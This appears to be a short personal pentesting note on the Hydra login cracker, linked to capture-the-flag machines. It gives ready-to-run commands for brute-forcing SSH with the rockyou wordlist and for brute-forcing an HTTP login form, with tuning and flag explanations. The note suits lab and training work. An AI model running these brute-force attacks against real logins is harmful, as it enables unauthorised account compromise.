---
type: tool
category: bruteforcer
related: [[ssh-bruteforce]]
---

# Hydra

Fast network login cracker supporting SSH, FTP, HTTP, and more.

## Command

```sh
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4
```

- `-l` single login, `-L` list; `-P` password list.
- `-t` tasks; keep low (e.g. 4) for SSH to avoid throttling.

## HTTP form brute force (`http-post-form`)

```sh
hydra -l admin -P rockyou.txt TARGET http-post-form \
  "/index.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=xxx:F=Credenciales incorrectas."
```

- `F=` = failure text; `H=` = a header (session cookie) injected per attempt.

## Seen in

[[breakmyssh]], [[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[basic-pentesting]], [[simple-ctf]], [[grooti]], [[winfake]], [[bruteshock]]
